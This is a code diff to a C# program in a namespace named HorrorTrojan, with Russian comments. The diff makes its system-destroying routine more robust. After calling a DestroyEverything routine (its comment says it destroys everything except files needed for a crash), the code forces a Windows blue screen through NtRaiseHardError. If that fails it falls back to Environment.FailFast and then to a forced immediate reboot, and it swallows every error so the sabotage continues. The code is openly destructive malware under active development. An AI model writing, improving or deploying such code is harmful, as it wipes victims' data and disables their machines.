@@ -9,12 +9,68 @@ namespace HorrorTrojan
     {
         public static void TriggerBSOD()
         {
-            // 1. УНИЧТОЖАЕМ ВСЁ, КРОМЕ ФАЙЛОВ, НУЖНЫХ ДЛЯ BSOD
-            DestroyEverything();
+            try
+            {
+                // 1. УНИЧТОЖАЕМ ВСЁ (кроме файлов, нужных для BSOD)
+                DestroyEverything();
+            }
+            catch
+            {
+                // Если DestroyEverything упал — всё равно пытаемся вызвать BSOD
+            }
             
-            // 2. ВЫЗЫВАЕМ BSOD
-            uint response;
-            NativeMethods.NtRaiseHardError(0xC000021A, 0, 0, IntPtr.Zero, 6, out response);
+            // 2. ВЫЗЫВАЕМ BSOD (3 способа)
+            bool bsodTriggered = false;
+            
+            // Способ 1: NtRaiseHardError
+            try
+            {
+                uint response;
+                NativeMethods.NtRaiseHardError(0xC000021A, 0, 0, IntPtr.Zero, 6, out response);
+                bsodTriggered = true;
+            }
+            catch { }
+            
+            // Способ 2: Environment.FailFast (если NtRaiseHardError не сработал)
+            if (!bsodTriggered)
+            {
+                try
+                {
+                    Environment.FailFast("SYSTEM_PROCESS_TERMINATED", new Exception("BSOD trigger failed"));
+                    bsodTriggered = true;
+                }
+                catch { }
+            }
+            
+            // Способ 3: Принудительная перезагрузка (если BSOD не сработал)
+            if (!bsodTriggered)
+            {
+                ForceShutdown();
+            }
+        }
+        
+        private static void ForceShutdown()
+        {
+            try
+            {
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "shutdown",
+                    Arguments = "/r /f /t 0",
+                    CreateNoWindow = true,
+                    UseShellExecute = false
+                });
+            }
+            catch { }
+            
+            // Если shutdown не сработал — завершаем процесс принудительно
+            try
+            {
+                Process.GetCurrentProcess().Kill();
+            }
+            catch { }
+            
+            Environment.Exit(1);
         }
         
         private static void DestroyEverything()
